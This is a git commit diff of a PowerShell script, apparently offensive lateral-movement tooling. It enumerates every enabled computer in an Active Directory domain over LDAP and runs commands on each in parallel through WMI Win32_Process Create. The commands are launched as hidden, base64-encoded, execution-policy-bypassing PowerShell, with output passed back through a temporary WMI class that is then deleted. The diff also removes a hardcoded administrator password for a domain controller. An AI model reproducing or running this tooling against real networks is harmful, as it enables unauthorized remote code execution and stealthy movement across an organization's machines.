707e9a9d1b0c81fe1e80d2a4814304edbdf41687
ViperOne <68926315+The-Viper-One@users.noreply.github.com>
2023-09-18 11:45:42 +0100

    Update WMILocal-RunSpaceTest.ps1

--- WMILocal-RunSpaceTest.ps1
+++ WMILocal-RunSpaceTest.ps1
@@ -1,9 +1,29 @@
-$Command = "whoami"
-$Username = "administrator"
-$Password = "Password123!"
-$ComputerName = "dc01.security.local"
-$LocalAuth = $True
-$Class = "PMEClass"
+$directoryEntry = [ADSI]"LDAP://security.local"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
+$Command = "ipconfig ; hostname"
+$LocalAuth = $true
+
+$runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
+$runspacePool.Open()
+$runspaces = New-Object System.Collections.ArrayList
+
+
+$scriptBlock = {
+    param ($computerName, $Command, $Username, $Password, $LocalAuth)
+
+    Function LocalWMI {
+
+param (
+    [string]$Command = "ipconfig",
+    [string]$Username = "",
+    [string]$Password = "",
+    [string]$ComputerName = "",
+    [switch]$LocalAuth = $true,
+    [string]$Class = "PMEClass"
+)
 
     $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
 	$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
@@ -54,7 +74,7 @@ if ($LocalAuth){
 	function CreateScriptInstance([string]$ComputerName, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
     $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred
     
-    if (!$classCheck) {
+    if (!$classCheck) {Write-Host "ClassCheck"
 $Code = "CgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACIAXABcACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQBcAHIAbwBvAHQAXABjAGkAbQB2ADIAIgAsAFsAcw
 B0AHIAaQBuAGcAXQA6ADoARQBtAHAAdAB5ACwAJABuAHUAbABsACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAFsAIgBfAF8AQwBMAEEAUwBTACIAXQAgAD0AIAAiAFAATQBFAEMAbABhAHMAcwAiAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFEAdQBhAGwAaQBmAGkAZQByAHMALgBBAGQAZAAoACIAUwB0AGEAdABpAGMAIgAs
 ACQAdAByAHUAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBBAGQAZAAoACIAQwBvAG0AbQBhAG4AZABJAGQAIgAsAFsAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQwBpAG0AVAB5AHAAZQBdADoAOgBTAHQAcgBpAG4AZwAsACQAZgBhAGwAcwBlACkACgAgACAAIAAgAC
@@ -156,12 +176,12 @@ $result = ExecCommand $ComputerName $encodedCommand $Cred $Class $LocalAuth
 
 if ($LocalAuth){
 $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"  -Credential $cred
-Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred | Out-Null
+Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred
 }
 
 elseif (!$LocalAuth){
 $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
-Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
+Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName
 }
 
 
@@ -187,6 +207,180 @@ elseif (!$osinfo){
             Write-Host "[-] " -ForegroundColor "Red" -NoNewline
             Write-Host "ACCESS DENIED"
                 
+            }
         }
     }
 }
+    if ($LocalAuth) {return LocalWMI -Username $Username -Password $Password -ComputerName $computerName -Command $Command}
+    
+    Function WMI {
+
+param (
+  [string]$Command = 'whoami',
+  [string]$Computer = 'srv02.security.local',
+  [string]$Targets = '',
+  [string]$Domain = $env:USERDNSDOMAIN,
+  [string]$Username = "",
+  [string]$Method = "",
+  [string]$Module = "",
+  [string]$Hash = "",
+  [string]$Option = "",
+  [string]$Password = "",
+  [string]$Random = "ANewClass"
+)
+
+
+    function CreateScriptInstance([string]$Computer) {
+        $classCheck = Get-WmiObject -Class $Random -ComputerName $Computer -List -Namespace "root\cimv2"
+        if ($classCheck -eq $null) {
+            $newClass = New-Object System.Management.ManagementClass("\\$Computer\root\cimv2",[string]::Empty,$null)
+            $newClass["__CLASS"] = "$Random"
+            $newClass.Qualifiers.Add("Static",$true)
+            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
+            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
+            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
+            $newClass.Put() | Out-Null
+        }
+        $wmiInstance = Set-WmiInstance -Class $Random -ComputerName $Computer
+        $wmiInstance.GetType() | Out-Null
+        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
+        $wmiInstance.Dispose()
+        return $CommandId
+    }
+
+function GetScriptOutput([string]$Computer, [string]$CommandId) {
+    try {
+        $wmiInstance = Get-WmiObject -Class $Random -ComputerName $Computer -Filter "CommandId = '$CommandId'"
+        $result = $wmiInstance.CommandOutput
+        $wmiInstance.Dispose()
+        return $result
+    } 
+    catch {Write-Error $_.Exception.Message} 
+    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
+}
+
+
+    function ExecCommand([string]$Computer, [string]$Command) {
+        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
+        $process = Invoke-WmiMethod -ComputerName $Computer -Class Win32_Process -Name Create -ArgumentList $commandLine
+        if ($process.ReturnValue -eq 0) {
+            $started = Get-Date
+            Do {
+                if ($started.AddMinutes(2) -lt (Get-Date)) {
+                    Write-Host "PID: $($process.ProcessId) - Response took too long."
+                    break
+                }
+                $watcher = Get-WmiObject -ComputerName $Computer -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
+                Start-Sleep -Seconds 1
+            } While ($watcher -ne $null)
+            $scriptOutput = GetScriptOutput $Computer $scriptCommandId
+            return $scriptOutput
+        }
+    }
+
+    $commandString = $Command
+    $scriptCommandId = CreateScriptInstance $Computer
+    if ($scriptCommandId -eq $null) {
+        Write-Error "Error creating remote instance."
+    }
+    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Random -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
+    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
+    $result = ExecCommand $Computer $encodedCommand
+    Write-Output $result
+
+$wmiClass = Get-WmiObject -Class $Random -ComputerName $Computer -Namespace "root\cimv2"
+Remove-WmiObject -Class "$Random" -Namespace "root\cimv2" -ComputerName $Computer | Out-Null
+}
+    if (!$LocalAuth) {return WMI -ComputerName $computerName -Command $Command}
+
+}
+
+function Display-ComputerStatus {
+    param (
+        [string]$ComputerName,
+        [string]$OS,
+        [System.ConsoleColor]$statusColor = 'White',
+        [string]$statusSymbol = "",
+        [string]$statusText = "",
+        [int]$NameLength,
+        [int]$OSLength
+    )
+
+    # Prefix "WMI"
+    Write-Host "WMI " -ForegroundColor Yellow -NoNewline
+    Write-Host "   " -NoNewline
+
+    # Attempt to resolve the IP address
+    $IP = $null
+    try {
+        $Ping = New-Object System.Net.NetworkInformation.Ping
+        $IP = $($Ping.Send($ComputerName).Address).IPAddressToString
+        Write-Host ("{0,-16}" -f $IP) -NoNewline
+    } catch {
+        Write-Host ("{0,-16}" -f "") -NoNewline
+    }
+
+    # Display ComputerName and OS
+    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
+    Write-Host "   " -NoNewline
+    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
+    Write-Host "   " -NoNewline
+
+    # Display status symbol and text
+    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
+    Write-Host $statusText
+}
+
+# Create and invoke runspaces for each computer
+foreach ($computer in $computers) {
+    $ComputerName = $computer.Properties["dnshostname"][0]
+    $OS = $computer.Properties["operatingSystem"][0]
+
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth)
+    $runspace.RunspacePool = $runspacePool
+
+    [void]$runspaces.Add([PSCustomObject]@{
+        Runspace = $runspace
+        Handle = $runspace.BeginInvoke()
+        ComputerName = $ComputerName
+        OS = $OS
+        Completed = $false
+    })
+    }
+
+
+# Poll the runspaces and display results as they complete
+do {
+    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+        if ($runspace.Handle.IsCompleted) {
+            $runspace.Completed = $true
+            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
+            
+            if ($result -eq "Access Denied"){
+
+            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
+            continue
+
+}
+            elseif ($result -eq "Unspecified Error"){
+
+            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
+            continue
+
+}
+            elseif ($result) {
+            
+            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+            $result | Write-Host 
+            
+            }
+
+        }
+    }
+    Start-Sleep -Milliseconds 100
+} while ($runspaces | Where-Object {-not $_.Completed})
+
+# Clean up
+$runspacePool.Close()
+$runspacePool.Dispose()
+
